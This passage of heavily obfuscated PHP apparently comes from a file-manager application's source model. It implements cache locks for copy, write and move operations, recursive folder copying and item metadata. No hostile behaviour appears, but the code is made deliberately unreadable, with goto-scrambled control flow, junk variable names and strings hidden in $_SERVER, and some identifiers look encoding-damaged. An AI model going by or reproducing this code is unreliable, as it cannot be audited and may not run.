str_replace($EÎÊÂ¹ë‘¸[490], $EÎÊÂ¹ë‘¸[8], $fã¦İÉŠ«Å); $e¤ÂøÒŒÂ‚ = array($EÎÊÂ¹ë‘¸[408] => str_replace($EÎÊÂ¹ë‘¸[490], $EÎÊÂ¹ë‘¸[8], $fã¦İÉŠ«Å), $EÎÊÂ¹ë‘¸[512] => intval($bà”­‚é‹¼[$EÎÊÂ¹ë‘¸[397]]), $EÎÊÂ¹ë‘¸[84] => $this->pathInfoFilter($bà”­‚é‹¼)); goto EÏˆ®¡³; E†ƒ„Ì¼’³: $C†Ë‘×–†× = $this->parentLevelArray($bà”­‚é‹¼[$EÎÊÂ¹ë‘¸[481]]); array_shift($C†Ë‘×–†×); $fã¦İÉŠ«Å = $f·¼§íÄĞò; goto dÖìóø‹İ; cñ¡«´¢ö : } return $E×š¢å±ŠÔ; goto dÌ«õ¨ìŒ; FÆ°÷š “í: $dÂ‡å¤Ã = array_to_keyvalue($dÂ‡å¤Ã, $EÎÊÂ¹ë‘¸[390]); $f·¼§íÄĞò = "\x2f{$d…©«Áƒ…[$EÎÊÂ¹ë‘¸[28]]}\x2f"; $f·¼§íÄĞò = $f·¼§íÄĞò == $EÎÊÂ¹ë‘¸[490] ? $EÎÊÂ¹ë‘¸[8] : $f·¼§íÄĞò; goto EÜŸÏó; CÛåÛï»¸ğ: $this->_listAppendAuth($dÂ‡å¤Ã); $this->_listAppendUser($dÂ‡å¤Ã); $this->_listAppendPath($dÂ‡å¤Ã); goto FÆ°÷š “í; dÌ«õ¨ìŒ: } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($dÜĞ¡“çõ) { goto aÂÊˆìœ°À; a×ôÍÁºœÖ: $this->_lockEvent($dÜĞ¡“çõ, array($FŸçšĞ¶[516], $FŸçšĞ¶[517]), $FÌŠ”êØ¶œ); $this->_lockCheckEnd($FŸçšĞ¶[513], $dÜĞ¡“çõ); goto BîèßÚ­Òè; aÂÊˆìœ°À: $FŸçšĞ¶ =& $_SERVER[µ…]; if (!$this->allowLock()) { return; } $this->_lockCheck($FŸçšĞ¶[513], $dÜĞ¡“çõ); goto c†ˆ‹ÛÂ; c†ˆ‹ÛÂ: $FÌŠ”êØ¶œ = 1; $this->_lockEvent($dÜĞ¡“çõ, array($FŸçšĞ¶[514], $FŸçšĞ¶[515]), $FÌŠ”êØ¶œ); $this->_lockParent($dÜĞ¡“çõ, array($FŸçšĞ¶[515]), $FÌŠ”êØ¶œ); goto a×ôÍÁºœÖ; BîèßÚ­Òè: } public function lockCopyEnd($C„êôñ¡) { $cÜ¥÷‹“ =& $_SERVER[µ…]; if (!$this->allowLock()) { return; } $aˆØŞä§´» = 0; $this->_lockEvent($C„êôñ¡, array($cÜ¥÷‹“[514], $cÜ¥÷‹“[515]), $aˆØŞä§´»); $this->_lockParent($C„êôñ¡, array($cÜ¥÷‹“[515]), $aˆØŞä§´»); $this->_lockEvent($C„êôñ¡, array($cÜ¥÷‹“[516], $cÜ¥÷‹“[517]), $aˆØŞä§´»); } public function lockWriteStart($EÄ„ÊÏñ¤‚, $f ÒÊ„ö½Ñ = '') { goto fµÕî¬ËÊ±; C‰¦½§ŸÊ³: $f¡ïó¶Å“‰ = 1; $this->_lockKey($e¾ÃÖøå ­[518] . $EÄ„ÊÏñ¤‚ . $e¾ÃÖøå ­[94] . $f ÒÊ„ö½Ñ, $f¡ïó¶Å“‰); $this->_lockEvent($EÄ„ÊÏñ¤‚, array($e¾ÃÖøå ­[513], $e¾ÃÖøå ­[515]), $f¡ïó¶Å“‰); goto FöŒ££³Š…; FöŒ££³Š…: $this->_lockParent($EÄ„ÊÏñ¤‚, array($e¾ÃÖøå ­[513], $e¾ÃÖøå ­[515]), $f¡ïó¶Å“‰); $this->_lockCheckEnd($e¾ÃÖøå ­[514], $EÄ„ÊÏñ¤‚); goto fêÜÇ´»Èº; fµÕî¬ËÊ±: $e¾ÃÖøå ­ =& $_SERVER[µ…]; if (!$this->allowLock()) { return; } $this->_lockCheck($e¾ÃÖøå ­[514], $EÄ„ÊÏñ¤‚); goto C‰¦½§ŸÊ³; fêÜÇ´»Èº: } public function lockWriteEnd($AÅ‰êÕĞë, $EÂãœ¥´» = '') { $eÈö¥Øù¤ =& $_SERVER[µ…]; if (!$this->allowLock()) { return; } $D…ÈŒç á = 0; $this->_lockKey($eÈö¥Øù¤[518] . $AÅ‰êÕĞë . $eÈö¥Øù¤[94] . $EÂãœ¥´», $D…ÈŒç á); $this->_lockEvent($AÅ‰êÕĞë, array($eÈö¥Øù¤[513], $eÈö¥Øù¤[515]), $D…ÈŒç á); $this->_lockParent($AÅ‰êÕĞë, array($eÈö¥Øù¤[513], $eÈö¥Øù¤[515]), $D…ÈŒç á); } public function lockMoveStart($f±Ú‡‰Ü­Û) { goto bñìˆˆ³ò°; bñìˆˆ³ò°: $c×äÂ¸ƒ =& $_SERVER[µ…]; if (!$this->allowLock()) { return; } $this->_lockCheck($c×äÂ¸ƒ[515], $f±Ú‡‰Ü­Û); goto fÓÚ˜À“Ì; F”Ñ˜ÍºÓÌ: $this->_lockParent($f±Ú‡‰Ü­Û, array($c×äÂ¸ƒ[513], $c×äÂ¸ƒ[515]), $e¼ÚäÃß‚ˆ); $this->_lockEvent($f±Ú‡‰Ü­Û, array($c×äÂ¸ƒ[520], $c×äÂ¸ƒ[516], $c×äÂ¸ƒ[517]), $e¼ÚäÃß‚ˆ); $this->_lockCheckEnd($c×äÂ¸ƒ[515], $f±Ú‡‰Ü­Û); goto bŞ‘å–Ùá; fÓÚ˜À“Ì: $e¼ÚäÃß‚ˆ = 1; $this->_lockKey($c×äÂ¸ƒ[519] . $f±Ú‡‰Ü­Û, $e¼ÚäÃß‚ˆ); $this->_lockEvent($f±Ú‡‰Ü­Û, array($c×äÂ¸ƒ[513], $c×äÂ¸ƒ[514]), $e¼ÚäÃß‚ˆ); goto F”Ñ˜ÍºÓÌ; bŞ‘å–Ùá: } public function lockMoveEnd($f“Ä…Ê´ç) { goto Bä‡Ìãˆ²Â; Bä‡Ìãˆ²Â: $e¶ÜšÌÄÖ‰ =& $_SERVER[µ…]; if (!$this->allowLock()) { return; } $f­ÙŠŞŸ‘ = 0; goto D´›â÷†ã¨; FÚÀ‡‰Ç: $this->_lockEvent($f“Ä…Ê´ç, array($e¶ÜšÌÄÖ‰[520], $e¶ÜšÌÄÖ‰[516], $e¶ÜšÌÄÖ‰[517]), $f­ÙŠŞŸ‘); goto a¤øÙ…áéÌ; D´›â÷†ã¨: $this->_lockKey($e¶ÜšÌÄÖ‰[519] . $f“Ä…Ê´ç, $f­ÙŠŞŸ‘); $this->_lockEvent($f“Ä…Ê´ç, array($e¶ÜšÌÄÖ‰[513], $e¶ÜšÌÄÖ‰[514]), $f­ÙŠŞŸ‘); $this->_lockParent($f“Ä…Ê´ç, array($e¶ÜšÌÄÖ‰[513], $e¶ÜšÌÄÖ‰[515]), $f­ÙŠŞŸ‘); goto FÚÀ‡‰Ç; a¤øÙ…áéÌ: } private function _lockCheck($cë„¿Æà, $fÅÕÍœ¸ÊØ) { goto e˜ÁÛ”ˆ‰†; aŠîÏƒÚ¦Ô: CacheLock::setErrorMsg($b¯¤œØâ‰­[159] . htmlspecialchars($dìÉ±‘ğßò[$b¯¤œØâ‰­[28]]) . $b¯¤œØâ‰­[499] . $Aï¾°‚†É); $this->_lockKey($aÚ ó®ŒˆŒ, 1); $this->_lockKey($aÚ ó®ŒˆŒ, 0); goto d†®ÀâéØ; e˜ÁÛ”ˆ‰†: $b¯¤œØâ‰­ =& $_SERVER[µ…]; $dìÉ±‘ğßò = $this->sourceInfo($fÅÕÍœ¸ÊØ); $aÚ ó®ŒˆŒ = $cë„¿Æà . $b¯¤œØâ‰­[94] . $fÅÕÍœ¸ÊØ; goto fì¡³ ¿Œ; fì¡³ ¿Œ: $this->_lockTimeStart[$aÚ ó®ŒˆŒ] = timeFloat(); if (!is_array($dìÉ±‘ğßò)) { return; } $Aï¾°‚†É = LNG($b¯¤œØâ‰­[521]); goto aŠîÏƒÚ¦Ô; d†®ÀâéØ: $AÄö·ºÉ–˜ = array_reverse($this->parentLevelArray($dìÉ±‘ğßò[$b¯¤œØâ‰­[481]])); foreach ($AÄö·ºÉ–˜ as $AŒªíŸ›’º) { $aÚ ó®ŒˆŒ = $cë„¿Æà . $b¯¤œØâ‰­[522] . $AŒªíŸ›’º; if (CacheLock::lockGet($b¯¤œØâ‰­[523] . $aÚ ó®ŒˆŒ)) { $dìÉ±‘ğßò = $this->sourceInfo($AŒªíŸ›’º); CacheLock::setErrorMsg($b¯¤œØâ‰­[159] . htmlspecialchars($dìÉ±‘ğßò[$b¯¤œØâ‰­[28]]) . $b¯¤œØâ‰­[499] . $Aï¾°‚†É); $this->_lockKey($aÚ ó®ŒˆŒ, 1); $this->_lockKey($aÚ ó®ŒˆŒ, 0); } } goto d…Ş•’¿Áæ; d…Ş•’¿Áæ: } private function _lockCheckEnd($E²é¬Âˆ, $DÜ­ÚéÊç) { goto aïÉîÒ›¨Ÿ; BÌæ«ÔŒ…˜: if ($d–¶³Óè > 0.5) { unset(self::$cacheSourceInfo[$a—˜‹ÂÉ°á[432] . $DÜ­ÚéÊç]); } $e£°‘Ùİƒ³ = $this->sourceInfo($DÜ­ÚéÊç); if (!$e£°‘Ùİƒ³) { show_json(LNG($a—˜‹ÂÉ°á[104]), !1); } goto B‡Äº×˜; aïÉîÒ›¨Ÿ: $a—˜‹ÂÉ°á =& $_SERVER[µ…]; $CÆªÅ‰™®‰ = $E²é¬Âˆ . $a—˜‹ÂÉ°á[94] . $DÜ­ÚéÊç; CacheLock::setErrorMsg($a—˜‹ÂÉ°á[373]); goto e¨Ÿ¢©Í­; e¨Ÿ¢©Í­: if (!isset($this->_lockTimeStart[$CÆªÅ‰™®‰])) { return; } $d–¶³Óè = timeFloat() - $this->_lockTimeStart[$CÆªÅ‰™®‰]; unset($this->_lockTimeStart[$CÆªÅ‰™®‰]); goto BÌæ«ÔŒ…˜; B‡Äº×˜: } private function _lockParent($E–Å²Àé‰, $cŠÉ»À•ÌË, $e‡¶Ö¶Êß°) { if (!$this->autoLockSet) { return; } $dš“¶Ó³ôÍ = $this->sourceInfo($E–Å²Àé‰); if (!is_array($dš“¶Ó³ôÍ)) { return; } $bÇÕœÈµ‰Ê = array_reverse($this->parentLevelArray($dš“¶Ó³ôÍ[$_SERVER[µ…][481]])); foreach ($bÇÕœÈµ‰Ê as $E¶ŒÖ¿…‰) { $this->_lockEvent($E¶ŒÖ¿…‰, $cŠÉ»À•ÌË, $e‡¶Ö¶Êß°); } } private function _lockEvent($C”¥˜¸Øå, $dµç²»ÜÁ, $bâ¡‚ÖÆÍ×) { $f©Ù™òº‚ƒ =& $_SERVER[µ…]; if (!$this->autoLockSet) { return; } foreach ($dµç²»ÜÁ as $a¤ë¬¯×Øä) { $bÂì¶Äõ = $a¤ë¬¯×Øä . $f©Ù™òº‚ƒ[94] . $C”¥˜¸Øå; if ($bâ¡‚ÖÆÍ× && CacheLock::lockGet($f©Ù™òº‚ƒ[523] . $bÂì¶Äõ)) { continue; } $this->_lockKey($bÂì¶Äõ, $bâ¡‚ÖÆÍ×); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($CŞ•¤©±Â‹, $cŒ¾³Î¨ã = 1) { $Fø§–›¯Ì¾ = $_SERVER[µ…][523] . md5($CŞ•¤©±Â‹); if ($cŒ¾³Î¨ã) { if (isset(self::$_lockItemArr[$Fø§–›¯Ì¾])) { return; } self::$_lockItemArr[$Fø§–›¯Ì¾] = 1; CacheLock::lock($Fø§–›¯Ì¾, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$Fø§–›¯Ì¾])) { return; } unset(self::$_lockItemArr[$Fø§–›¯Ì¾]); CacheLock::unlock($Fø§–›¯Ì¾); } } public function isParentOf($A›âù¢œè†, $a£ÛÃÉ”²¾) { goto CØğç­¶Ú; CØğç­¶Ú: $d‹Ìçœ•çó =& $_SERVER[µ…]; $fó×ç¿Áİ = $this->sourceInfo($A›âù¢œè†); $e§Ì‹±¶ÅÑ = $this->sourceInfo($a£ÛÃÉ”²¾); goto cØî‡í½µ; cØî‡í½µ: $A–ãä–×ë¸ = $fó×ç¿Áİ[$d‹Ìçœ•çó[481]] . $fó×ç¿Áİ[$d‹Ìçœ•çó[390]] . $d‹Ìçœ•çó[47]; $fÀ“ÁÜ²ª = $e§Ì‹±¶ÅÑ[$d‹Ìçœ•çó[481]] . $e§Ì‹±¶ÅÑ[$d‹Ìçœ•çó[390]] . $d‹Ìçœ•çó[47]; $eï¯Úƒšİ = strpos($fÀ“ÁÜ²ª, $A–ãä–×ë¸) === 0; goto DÔå±®Š¿“; DÔå±®Š¿“: return $eï¯Úƒšİ; goto d×¥†Í¸; d×¥†Í¸: } private $targetIsDelete = 0; public function copy($CÎ©—¨›’ß, $E­Üß²»¢‚, $d‘·‡—Ò„ê = REPEAT_REPLACE, $bâ÷ÁÎÖìÈ = '') { goto F»¥ƒÖªÄî; d†Úåƒî£: $this->saveAll($AÙæîóÎùà[$C•¢×‘··ö[526]]); Model($C•¢×‘··ö[191])->linkAdd($AÙæîóÎùà[$C•¢×‘··ö[524]]); $this->folderSizeReset($E­Üß²»¢‚); goto eˆæáñø‡Å; F»¥ƒÖªÄî: $C•¢×‘··ö =& $_SERVER[µ…]; $Dì‚‡ù¬æ§ = $this->sourceInfo($CÎ©—¨›’ß); $bé™„´Ÿ› = $this->sourceInfo($E­Üß²»¢‚); goto DÏ¤¢…©ÜÙ; cõŸĞÄÇ“ö: $this->targetIsDelete = intval($Dì‚‡ù¬æ§[$C•¢×‘··ö[417]]); $CŒ´÷·ˆó‹ = $this->fileNameExistCache($E­Üß²»¢‚, $Dì‚‡ù¬æ§[$C•¢×‘··ö[28]]); $C·ŞŸ‘¿¢ = $this->_copy($CÎ©—¨›’ß, $E­Üß²»¢‚, $d‘·‡—Ò„ê, $AÙæîóÎùà, !0, $bâ÷ÁÎÖìÈ); goto eĞ§¿ÚÇ‡ã; C‡ä¹¹‡…: if ($Dì‚‡ù¬æ§[$C•¢×‘··ö[397]] == $C•¢×‘··ö[86] && $CŒ´÷·ˆó‹ == $C·ŞŸ‘¿¢) { $this->folderSizeResetChildren($CŒ´÷·ˆó‹); } Model($C•¢×‘··ö[527])->addAll($AÙæîóÎùà[$C•¢×‘··ö[525]], array(), !0); if ($CŒ´÷·ˆó‹ != $C·ŞŸ‘¿¢ || $Dì‚‡ù¬æ§[$C•¢×‘··ö[397]] == $C•¢×‘··ö[86]) { Model($C•¢×‘··ö[528])->eventCopy($C·ŞŸ‘¿¢); } goto d†Úåƒî£; eˆæáñø‡Å: $this->updateModifyTime($E­Üß²»¢‚); return $C·ŞŸ‘¿¢; goto Cë§Ë±¡ß¾; F‘Ôˆ”òÉ: $this->lockCopyStart($CÎ©—¨›’ß); $this->lockWriteStart($E­Üß²»¢‚, $CÚ²Ğà‹ğâ); $AÙæîóÎùà = array($C•¢×‘··ö[524] => array(), $C•¢×‘··ö[525] => array(), $C•¢×‘··ö[526] => array()); goto cõŸĞÄÇ“ö; DÏ¤¢…©ÜÙ: if (!$Dì‚‡ù¬æ§ || !$bé™„´Ÿ› || $bé™„´Ÿ›[$C•¢×‘··ö[397]] != $C•¢×‘··ö[86]) { return !1; } if ($this->isParentOf($CÎ©—¨›’ß, $E­Üß²»¢‚)) { return !1; } $CÚ²Ğà‹ğâ = $bâ÷ÁÎÖìÈ ? $bâ÷ÁÎÖìÈ : $Dì‚‡ù¬æ§[$C•¢×‘··ö[28]]; goto F‘Ôˆ”òÉ; eĞ§¿ÚÇ‡ã: $this->_childrenListClear(); $this->lockCopyEnd($CÎ©—¨›’ß); $this->lockWriteEnd($E­Üß²»¢‚, $CÚ²Ğà‹ğâ); goto C‡ä¹¹‡…; Cë§Ë±¡ß¾: } private function _copy($AÍƒ³õå£Ş, $A¸Üê¼â¡å, $FÙØ¦âšãç, &$DôŠšïõæ, $f±„’ŒóùŒ, $fë°‰Ò”ç– = '') { goto fóÑ†ã; fóÑ†ã: $C«Çøù­ºö =& $_SERVER[µ…]; $c­‡ÕÎ§Û¦ = $this->sourceInfoCache($AÍƒ³õå£Ş); $A¢ìßĞ¶½â = $c­‡ÕÎ§Û¦[$C«Çøù­ºö[397]] == $C«Çøù­ºö[86]; goto bâ²¡Âçˆ; eøõéÈ¢®±: return $FÈàŒÊœ‚¢; goto B¤ÜšƒËÃß; bâ²¡Âçˆ: $A¹œ¨²™Šõ = $fë°‰Ò”ç– ? $fë°‰Ò”ç– : $c­‡ÕÎ§Û¦[$C«Çøù­ºö[28]]; $c¬‰·¢èùÂ = $this->fileNameExistCache($A¸Üê¼â¡å, $A¹œ¨²™Šõ); if ($f±„’ŒóùŒ) { $this->_childrenAllMake($AÍƒ³õå£Ş); if ($A¢ìßĞ¶½â && $c¬‰·¢èùÂ) { $this->_childrenAllMake($c¬‰·¢èùÂ); } } goto DÔÛ´Å¿¼—; DÔÛ´Å¿¼—: if (!$c¬‰·¢èùÂ) { return $this->_copyCreate($AÍƒ³õå£Ş, $A¸Üê¼â¡å, $A¹œ¨²™Šõ, $DôŠšïõæ); } $FÈàŒÊœ‚¢ = $c¬‰·¢èùÂ; if ($A¢ìßĞ¶½â) { if ($FÙØ¦âšãç == REPEAT_RENAME_FOLDER) { $A¹œ¨²™Šõ = $this->fileNameAutoCache($A¸Üê¼â¡å, $A¹œ¨²™Šõ, $FÙØ¦âšãç, $A¢ìßĞ¶½â); $FÈàŒÊœ‚¢ = $this->_copyCreate($AÍƒ³õå£Ş, $A¸Üê¼â¡å, $A¹œ¨²™Šõ, $DôŠšïõæ); } else { $C¨ç§Ñ˜ì“ = $this->_childrenList($AÍƒ³õå£Ş); foreach ($C¨ç§Ñ˜ì“ as $b‹—ÕÁáê) { $this->_copy($b‹—ÕÁáê[$C«Çøù­ºö[390]], $c¬‰·¢èùÂ, $FÙØ¦âšãç, $DôŠšïõæ, !1); } } } else { if ($FÙØ¦âšãç == REPEAT_RENAME || $FÙØ¦âšãç == REPEAT_RENAME_FOLDER) { $A¹œ¨²™Šõ = $this->fileNameAutoCache($A¸Üê¼â¡å, $A¹œ¨²™Šõ, $FÙØ¦âšãç, $A¢ìßĞ¶½â); $FÈàŒÊœ‚¢ = $this->_copyCreate($AÍƒ³õå£Ş, $A¸Üê¼â¡å, $A¹œ¨²™Šõ, $DôŠšïõæ); } else { if ($FÙØ¦âšãç == REPEAT_REPLACE) { $dØáÉ“©ë = $this->sourceInfoCache($c¬‰·¢èùÂ); $aí»ï™ñ¡ = $this->fileHistory($dØáÉ“©ë, $c­‡ÕÎ§Û¦[$C«Çøù­ºö[441]], $c­‡ÕÎ§Û¦[$C«Çøù­ºö[77]]); if ($aí»ï™ñ¡) { $DôŠšïõæ[$C«Çøù­ºö[524]][] = $c­‡ÕÎ§Û¦[$C«Çøù­ºö[441]]; } } else { if ($FÙØ¦âšãç == REPEAT_SKIP) { } } } Hook::trigger($C«Çøù­ºö[529], array($C«Çøù­ºö[530], $c­‡ÕÎ§Û¦, 0)); } goto eøõéÈ¢®±; B¤ÜšƒËÃß: } private function _copyCreate($aßÓàÈ’æ, $C¼èŸŠà…¡, $Dìà”ØÏ„•, &$A£²ÃøªÂ‹) { goto CÊ­„ØÍÊË; eî¡ôÉ˜„: $d£ŒÂ’âÒ = $this->add($c¯†›Ñ®‚»); $EãïµĞ³Í = array($B›ƒ¯‹Ãò[390] => $d£ŒÂ’âÒ, $B›ƒ¯‹Ãò[28] => $Dìà”ØÏ„•); $this->_copyApplyMeta($EãïµĞ³Í, $A£²ÃøªÂ‹); goto EöóŠ»; fÏìĞÙÙî½: foreach ($Aã†Ìí ˆ‡ as $fÑ¾ÜôÕíŠ) { $cŠÚ¤´Í˜‹ = $fÑ¾ÜôÕíŠ[$B›ƒ¯‹Ãò[390]]; $B’´Ş¥Û× = $this->_childrenMatch($e¨ÑÃö¾â£, $fÑ¾ÜôÕíŠ, $Cö„ø¸‹˜); $b¡ÌÚïÁ“[] = array($B›ƒ¯‹Ãò[390], $cŠÚ¤´Í˜‹, $B›ƒ¯‹Ãò[472], $B’´Ş¥Û×[$B›ƒ¯‹Ãò[472]]); $b·ğ•ğˆ†[] = array($B›ƒ¯‹Ãò[390], $cŠÚ¤´Í˜‹, $B›ƒ¯‹Ãò[481], $B’´Ş¥Û×[$B›ƒ¯‹Ãò[481]]); $this->_copyApplyMeta($fÑ¾ÜôÕíŠ, $A£²ÃøªÂ‹); if ($fÑ¾ÜôÕíŠ[$B›ƒ¯‹Ãò[397]] != $B›ƒ¯‹Ãò[86]) { $A£²ÃøªÂ‹[$B›ƒ¯‹Ãò[524]][] = $fÑ¾ÜôÕíŠ[$B›ƒ¯‹Ãò[441]]; } } $this->chunkEventSet($B›ƒ¯‹Ãò[536], array($B›ƒ¯‹Ãò[537], $c¯†›Ñ®‚», $B¨ëÓ´’Å£)); $this->saveAll($b¡ÌÚïÁ“); goto aÎå©°³˜ ; EöóŠ»: if ($C––°”¢è˜[$B›ƒ¯‹Ãò[397]] != $B›ƒ¯‹Ãò[86]) { $A£²ÃøªÂ‹[$B›ƒ¯‹Ãò[524]][] = $C––°”¢è˜[$B›ƒ¯‹Ãò[441]]; return $d£ŒÂ’âÒ; } $f¼Îªò¸§ = array(); $fŒ´ƒ‚ãÖÁ = array(); goto bÉƒòÛµ”ˆ; c²ñ¸×…ÎÓ: $e¨ÑÃö¾â£[$aßÓàÈ’æ] = $d£ŒÂ’âÒ; $b¡ÌÚïÁ“ = array(); $b·ğ•ğˆ† = array(); goto fÏìĞÙÙî½; eåËÀˆŠ¬: $Cö„ø¸‹˜ = $this->sourceInfo($d£ŒÂ’âÒ); foreach ($f¼Îªò¸§ as $fÑ¾ÜôÕíŠ) { $cÉÔê¿ÊùÜ = $this->_makeItemData($fÑ¾ÜôÕíŠ, $Cö„ø¸‹˜, $fÑ¾ÜôÕíŠ[$B›ƒ¯‹Ãò[28]]); $cÉÔê¿ÊùÜ[$B›ƒ¯‹Ãò[481]] = $fÑ¾ÜôÕíŠ[$B›ƒ¯‹Ãò[481]]; $fŒ´ƒ‚ãÖÁ[] = $cÉÔê¿ÊùÜ; } $this->chunkEventSet($B›ƒ¯‹Ãò[534], array($B›ƒ¯‹Ãò[535], $c¯†›Ñ®‚», $B¨ëÓ´’Å£)); goto B§Ê’âÏ¸Î; B§Ê’âÏ¸Î: $this->addAll($fŒ´ƒ‚ãÖÁ, array(), !1); $Aã†Ìí ˆ‡ = $this->where(array($B›ƒ¯‹Ãò[472] => $d£ŒÂ’âÒ))->select(); $e¨ÑÃö¾â£ = $this->_childrenMakeRelation($f¼Îªò¸§, $Aã†Ìí ˆ‡); goto c²ñ¸×…ÎÓ; Fá°‘²À¼×: $c¯†›Ñ®‚» = $this->_makeItemData($C––°”¢è˜, $aÙÚº»š†, $Dìà”ØÏ„•); Hook::trigger($B›ƒ¯‹Ãò[531], $c¯†›Ñ®‚»); Hook::trigger($B›ƒ¯‹Ãò[532], array($B›ƒ¯‹Ãò[533], $c¯†›Ñ®‚», 0)); goto eî¡ôÉ˜„; CÊ­„ØÍÊË: $B›ƒ¯‹Ãò =& $_SERVER[µ…]; $C––°”¢è˜ = $this->sourceInfoCache($aßÓàÈ’æ); $aÙÚº»š† = $this->sourceInfoCache($C¼èŸŠà…¡); goto Fá°‘²À¼×; aÎå©°³˜ : $this->chunkEventSet($B›ƒ¯‹Ãò[538], array($B›ƒ¯‹Ãò[539], $c¯†›Ñ®‚», $B¨ëÓ´’Å£)); $this->saveAll($b·ğ•ğˆ†); return $d£ŒÂ’âÒ; goto C”ĞÊùø§›; bÉƒòÛµ”ˆ: $this->_childrenListAll($aßÓàÈ’æ, $f¼Îªò¸§); $B¨ëÓ´’Å£ = count($f¼Îªò¸§); if ($B¨ëÓ´’Å£ == 0) { return $d£ŒÂ’âÒ; } goto eåËÀˆŠ¬; C”ĞÊùø§›: } private function _childrenMakeRelation($D²ÅÌ®ÙŞô, $c¶Œ¬ÇÀè¨) { $C™áå³†á =& $_SERVER[µ…]; $b‚Ö‹™£òÕ = array(); $F¸¢²²ùÆ¹ = array(); foreach ($D²ÅÌ®ÙŞô as $aºÑˆ«¯¸Î) { $D£…¹âˆªÁ = $aºÑˆ«¯¸Î[$C™áå³†á[28]] . $C™áå³†á[8] . $aºÑˆ«¯¸Î[$C™áå³†á[481]]; $b‚Ö‹™£òÕ[$D£…¹âˆªÁ] = $aºÑˆ«¯¸Î[$C™áå³†á[390]]; } foreach ($c¶Œ¬ÇÀè¨ as $aºÑˆ«¯¸Î) { $D£…¹âˆªÁ = $aºÑˆ«¯¸Î[$C™áå³†á[28]] . $C™áå³†á[8] . $aºÑˆ«¯¸Î[$C™áå³†á[481]]; $a¤õ¹ÕÌ = $b‚Ö‹™£òÕ[$D£…¹âˆªÁ]; $F¸¢²²ùÆ¹[$a¤õ¹ÕÌ] = $aºÑˆ«¯¸Î[$C™áå³†á[390]]; } return $F¸¢²²ùÆ¹; } private function _childrenMatch($Eô‘ÚÉšˆ, $a¦¾ù¾» , $Aîó¬èÖß) { goto b™¢…ÏÂ·Ê; aÔ…­Ç†Â³: $EÀ±–¥¹ô = $D®ÖÕ…Á·‘[count($D®ÖÕ…Á·‘) - 1]; return array($D–Õ¼µó·[472] => $EÀ±–¥¹ô, $D–Õ¼µó·[481] => $BÏ·Å„Ú³Ú); goto fä·¹ğ÷²ã; CÕ«…½÷ø: foreach ($AÛåöá×ˆ as $F¹ô÷›¯¢Ç) { if (isset($Eô‘ÚÉšˆ[$F¹ô÷›¯¢Ç])) { $BÏ·Å„Ú³Ú .= $Eô‘ÚÉšˆ[$F¹ô÷›¯¢Ç] . $D–Õ¼µó·[540]; } } $BÏ·Å„Ú³Ú = rtrim($BÏ·Å„Ú³Ú, $D–Õ¼µó·[47]) . $D–Õ¼µó·[47]; $D®ÖÕ…Á·‘ = $this->parentLevelArray($BÏ·Å„Ú³Ú); goto aÔ…­Ç†Â³; b™¢…ÏÂ·Ê: $D–Õ¼µó· =& $_SERVER[µ…]; $BÏ·Å„Ú³Ú = $Aîó¬èÖß[$D–Õ¼µó·[481]]; $AÛåöá×ˆ = $this->parentLevelArray($a¦¾ù¾» [$D–Õ¼µó·[481]]); goto CÕ«…½÷ø; fä·¹ğ÷²ã: } private function _makeItemData($DˆÛ“ˆÃ, $cå¼Œã“İª, $b”¦ä§Ë‘) { $e‘ÒÅ¯¶Ì¡ =& $_SERVER[µ…]; $Dœ«´©Š§ = array($e‘ÒÅ¯¶Ì¡[541] => $DˆÛ“ˆÃ[$e‘ÒÅ¯¶Ì¡[397]], $e‘ÒÅ¯¶Ì¡[407] => $b”¦ä§Ë‘, $e‘ÒÅ¯¶Ì¡[542] => $DˆÛ“ˆÃ[$e‘ÒÅ¯¶Ì¡[399]], $e‘ÒÅ¯¶Ì¡[442] => $DˆÛ“ˆÃ[$e‘ÒÅ¯¶Ì¡[441]], $e‘ÒÅ¯¶Ì¡[543] => $DˆÛ“ˆÃ[$e‘ÒÅ¯¶Ì¡[77]], $e‘ÒÅ¯¶Ì¡[544] => $cå¼Œã“İª[$e‘ÒÅ¯¶Ì¡[398]], $e‘ÒÅ¯¶Ì¡[545] => $cå¼Œã“İª[$e‘ÒÅ¯¶Ì¡[478]], $e‘ÒÅ¯¶Ì¡[546] => USER_ID, $e‘ÒÅ¯¶Ì¡[547] => USER_ID, $e‘ÒÅ¯¶Ì¡[389] => $cå¼Œã“İª[$e‘ÒÅ¯¶Ì¡[390]], $e‘ÒÅ¯¶Ì¡[548] => $cå¼Œã“İª[$e‘ÒÅ¯¶Ì¡[481]] . $cå¼Œã“İª[$e‘ÒÅ¯¶Ì¡[390]] . $e‘ÒÅ¯¶Ì¡[47], $e‘ÒÅ¯¶Ì¡[416] => 0, $e‘ÒÅ¯¶Ì¡[549] => $e‘ÒÅ¯¶Ì¡[33]); return $Dœ«´©Š§; } private function _copyApplyMeta($FğôĞ£ß‚, &$Eéæã’—Ÿ¤) { $AËÔÑàçá¾ =& $_SERVER[µ…]; $bøÍÎ®ÏÌ = $FğôĞ£ß‚[$AËÔÑàçá¾[390]]; $dƒßøÊçÒø = $FğôĞ£ß‚[$AËÔÑàçá¾[28]]; if (!isset($FğôĞ£ß‚[$AËÔÑàçá¾[550]]) || !$FğôĞ£ß‚[$AËÔÑàçá¾[550]] || $FğôĞ£ß‚[$AËÔÑàçá¾[550]] == $AËÔÑàçá¾[491]) { $Eéæã’—Ÿ¤[$AËÔÑàçá¾[526]][] = array($AËÔÑàçá¾[390], $bøÍÎ®ÏÌ, $AËÔÑàçá¾[550], short_id($bøÍÎ®ÏÌ)); } if (Input::check($dƒßøÊçÒø, $AËÔÑàçá¾[551])) { $Eéæã’—Ÿ¤[$AËÔÑàçá¾[525]][] = array($AËÔÑàçá¾[390] => $bøÍÎ®ÏÌ, $AËÔÑàçá¾[92] => $AËÔÑàçá¾[438], $AËÔÑàçá¾[370] => str_replace($AËÔÑàçá¾[50], $AËÔÑàçá¾[33], Pinyin::encode($dƒßøÊçÒø))); $Eéæã’—Ÿ¤[$AËÔÑàçá¾[525]][] = array($AËÔÑàçá¾[390] => $bøÍÎ®ÏÌ, $AËÔÑàçá¾[92] => $AËÔÑàçá¾[437], $AËÔÑàçá¾[370] => Pinyin::encode($dƒßøÊçÒø, $AËÔÑàçá¾[552])); } } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($f¢–ùŸÓõ±) { goto C²óá«È»º; 